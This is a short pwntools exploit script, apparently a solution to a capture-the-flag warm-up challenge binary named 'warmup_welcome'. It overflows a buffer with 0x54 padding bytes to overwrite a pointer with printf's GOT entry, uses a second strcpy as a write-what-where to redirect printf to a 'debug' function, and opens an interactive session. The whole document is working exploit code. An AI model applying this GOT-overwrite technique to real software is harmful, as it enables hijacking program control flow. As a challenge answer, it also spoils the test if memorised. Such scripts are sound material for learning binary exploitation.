from pwn import *
elf = ELF('./warmup_welcome', checksec=False)
p = elf.process()
# 1 strcpy => 0x804d9d0 -> overwrite second pointer
# 2 strcpy => 0x804da30 -> write-what-where
p.sendlineafter(b': ', b'A'*(0x54) + p32(elf.got['printf']))
p.sendlineafter(b': ', p32(elf.sym['debug']))
p.interactive()
